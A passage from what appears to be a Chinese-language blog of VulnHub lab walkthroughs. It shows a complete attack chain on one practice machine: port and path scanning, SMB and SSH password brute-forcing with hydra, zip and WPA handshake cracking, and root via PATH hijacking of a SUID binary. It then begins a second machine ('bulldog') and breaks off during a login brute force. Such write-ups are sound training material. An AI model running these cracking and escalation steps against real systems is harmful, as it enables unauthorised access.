Difficulty&#x3D;264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s</span><br><span class="line">| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   NITIN&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: nitin</span><br><span class="line">|   NetBIOS computer name: NITIN\x00</span><br><span class="line">|   Domain name: 168.1.7</span><br><span class="line">|   FQDN: nitin.168.1.7</span><br><span class="line">|_  System time: 2020-02-14T21:43:57+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-14 11:13:57</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-5"><a class="markdownIt-Anchor" href="#web路径枚举-5"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.185/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F;                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F;                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086)                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F;                                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>在<code>index.html</code>页面的底端获取一段字符串<br /><code>####################GET#####smb##############free</code></p><p>在图片<code>/img/news.png</code>中获取信息<code>BlueKeep Attacks</code></p><blockquote><p>BlueKeep是Windows上RDP服务上的漏洞(CVE-2019-0708)，目测与本靶机关联并不大。</p></blockquote><h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2><p><code>enum4linux 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\sagar (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\blackjax (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\smb (Local User)</span><br></pre></td></tr></table></figure><p>获得三个账户名</p><p>使用smbmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Guest SMB session established on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            NO ACCESS</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185 -u smb</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            READ ONLY</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><p>账户smb可以登入SMB服务</p><p>使用hydra爆破SMB服务中SMB账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185</span><br><span class="line"></span><br><span class="line">[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;</span><br><span class="line">[445][smb] host: 192.168.31.185   login: smb</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure><p>密码为空</p><p>登入SMB服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smb</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">    .                                   D        0  Mon Nov  4 06:50:37 2019</span><br><span class="line">    ..                                  D        0  Mon Nov  4 06:37:28 2019</span><br><span class="line">    main.txt                            N       10  Mon Nov  4 06:45:38 2019</span><br><span class="line">    safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019</span><br><span class="line">    </span><br><span class="line">                9204224 blocks of size 1024. 6824568 blocks available</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get main.txt</span><br><span class="line">get safe.zip</span><br></pre></td></tr></table></figure><p><code>main.txt</code>中没有有效信息<br /><code>safe.zip</code>被加密<br />使用<code>fcrackzip</code>进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip</span><br><span class="line"></span><br><span class="line">    PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1</span><br></pre></td></tr></table></figure><p>解压压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip safe.zip</span><br><span class="line">hacker1</span><br></pre></td></tr></table></figure><p>得到两个文件</p><ul><li><code>secret.jpg</code> 有文字–“AFTER THE WALKOUT”，暂时不考虑图片隐写等其他因素</li><li><code>user.cap</code> WireShare打开之后是IEEE 802.11协议(WIFI)的流量包，可能存在握手包</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.cap</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                              Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: 41 minutes, 0 seconds                           0.30%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ snowflake ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C </span><br><span class="line">                       5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 </span><br><span class="line"></span><br><span class="line">      Transient Key  : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB </span><br><span class="line">                       47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 </span><br><span class="line">                       48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF </span><br><span class="line">                       1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F</span><br></pre></td></tr></table></figure><p>SSID为<code>blackjax</code>，密码为<code>snowflake</code></p><p>在WireShark中调试<br />Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit<br />添加Key记录<br /><code>wpa-pwd|snowflake:blackjax</code><br />流量包中未找到其他有效信息</p><p>尝试枚举SSH账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;smb\nblackjax\nsagar\nroot\nadmin\nhelo\nsnowflake&quot; &gt; test</span><br><span class="line">hydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525</span><br><span class="line">    [2525][ssh] host: 192.168.31.185   login: blackjax   password: snowflake</span><br></pre></td></tr></table></figure><p>获取账户blackjax</p><h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh blackjax@192.168.31.185 -p 2525</span><br><span class="line">snowflake</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>尝试SUID提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netscan</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br></pre></td></tr></table></figure><p><code>/usr/bin/netscan</code>有些异常</p><p>使用<code>strings</code>命令分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;usr&#x2F;bin&#x2F;netscan </span><br><span class="line"></span><br><span class="line">&#x2F;lib&#x2F;ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">QVhk</span><br><span class="line">UWVS</span><br><span class="line">t$,U</span><br><span class="line">[^_]</span><br><span class="line">netstat -antp</span><br><span class="line">;*2$&quot;(</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.7209</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">pingshell.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__x86.get_pc_thunk.bx</span><br><span class="line">_edata</span><br><span class="line">__data_start</span><br><span class="line">setgid@@GLIBC_2.0</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_start_main@@GLIBC_2.0</span><br><span class="line">__libc_csu_init</span><br><span class="line">_fp_hw</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setuid@@GLIBC_2.0</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rel.dyn</span><br><span class="line">.rel.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure><p>可以看到<code>netstat -antp</code><br />猜想这个二进制文件是在执行netstat命令<br />则可以进行PATH提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstat</span><br><span class="line">chmod 777 netstat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;netscan</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>PATH提权</p></blockquote><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p>参考资料</p><blockquote><p><a href="https://www.moonsec.com/archives/709">WP</a><br /><a href="https://www.freebuf.com/articles/system/221949.html">WP</a><br /><a href="https://www.xuebuyuan.com/3235974.html">SMB</a><br /><a href="https://www.anquanke.com/post/id/146799">PATH提权</a></p></blockquote><hr /><h1 id="bulldog"><a class="markdownIt-Anchor" href="#bulldog"></a> <a href="https://www.vulnhub.com/entry/bulldog-1,211/">bulldog</a></h1><p><code>2020/02/17 19:06:44</code></p><h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.121</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080&#x2F;tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">MAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sun Feb 16 21:45:10 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-6"><a class="markdownIt-Anchor" href="#web路径枚举-6"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.121/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;admin&#x2F;                                                  </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>尝试爆破8080端口下的Web路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;admin&#x2F;</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;robots.txt (CODE:200|SIZE:1071)</span><br><span class="line">                                                    </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.121:8080&#x2F;dev&#x2F;shell&#x2F; ----</span><br></pre></td></tr></table></figure><p>80端口与8080端口上的WEB服务的路径几乎一样，极可能是同一个站点。<br />访问两个WEB服务之后发现并无差别，先对80端口进行渗透。</p><h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2><p>访问路径<code>/admin/</code>跳转至登录界面<br />简单尝试弱口令后无效</p><p>访问路径<code>/dev/shell/</code>时提示 <strong>&quot;Please authenticate with the server to use Web-Shell&quot;</strong><br />猜测需要在之前的登录界面中登入后才能访问</p><p>访问路径<code>/dev/</code>与<code>/</code>时发现一些人名<br />制作简易字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Winston Churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Alan Brooke</span><br><span class="line">alan@bulldogindustries.com</span><br><span class="line">william@bulldogindustries.com</span><br><span class="line">malik@bulldogindustries.com</span><br><span class="line">kevin@bulldogindustries.com</span><br><span class="line">ashley@bulldogindustries.com</span><br><span class="line">nick@bulldogindustries.com</span><br><span class="line">sarah@bulldogindustries.com</span><br><span class="line">admin@bulldogindustries.com</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Nick</span><br><span class="line">nick</span><br><span class="line">Ashley</span><br><span class="line">ashley</span><br><span class="line">Kevin</span><br><span class="line">kevin</span><br><span class="line">Malik</span><br><span class="line">malik</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Alan</span><br><span class="line">alan</span><br><span class="line">Brooke</span><br><span class="line">brooke</span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br></pre></td></tr></table></figure><p>使用burpsuite进行账户爆破<br 